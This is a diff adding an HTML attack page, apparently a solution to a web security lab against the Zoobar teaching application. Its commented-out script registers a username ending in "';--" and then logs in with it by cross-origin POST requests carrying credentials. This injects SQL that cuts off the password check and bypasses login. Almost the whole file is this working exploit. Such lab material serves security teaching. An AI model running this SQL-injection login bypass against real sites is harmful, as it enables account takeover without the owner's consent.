@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>SQL Injection Logging - edydfang</title>
+	<meta charset="utf-8">
+</head>
+<body>
+<form id="hack">
+	<p>Enter the username you want to login</p>
+	<input type="text" id="username" name="username">
+	<input type="button" name="submit" value="Hack!" onclick="sqlInject()">
+</form>
+<iframe width=800 height=800 src="about:blank"></iframe>
+<!--
+<script type="text/javascript">
+function sqlInject() {
+	// user existence check action is protected by sql quote function, however password check is not
+	// so we first register an user with our intendted SQL injection sentence
+	var post_data_reg = "login_username=" + document.getElementById('username').value +"';--&login_password=test&submit_registration=Register"
+
+	console.log(post_data_reg);
+	var xhr = new XMLHttpRequest();
+	xhr.withCredentials = true;
+	xhr.open("POST", "http://zoobar.org/index.php", true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	// Simulate an HTTP redirect:
+	xhr.onload = function (e) {
+		console.log(xhr.readyState);
+	  if (xhr.readyState === 4) {
+	    if (xhr.status === 200) {
+	      console.log(xhr.responseText);
+	      zoobar_login();
+	    } else {
+	      console.error(xhr.statusText);
+	    }
+	  }
+	};
+	xhr.send(post_data_reg);
+}
+
+function zoobar_login() {
+	
+	// SELECT * FROM Person WHERE Username = 'username';-- AND Password = '1';
+	var post_data_login = "login_username=" + document.getElementById('username').value +"';--&login_password=hahaha&submit_login=Log+in";
+	console.log(post_data_login);
+	var xhr = new XMLHttpRequest();
+	xhr.withCredentials = true;
+	xhr.open("POST", "http://zoobar.org/index.php", true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	// Simulate an HTTP redirect:
+	xhr.onload = function (e) {
+	  if (xhr.readyState === 4) {
+	  	console.log(xhr.readyState);
+	    if (xhr.status === 200) {
+	      console.log(xhr.responseText);
+	      // async event listener
+	      window.location.replace("http://zoobar.org/index.php");
+	    } else {
+	      console.error(xhr.statusText);
+	    }
+	  }
+	};
+	xhr.send(post_data_login);
+}
+</script>
+-->
+</body>
+</html>
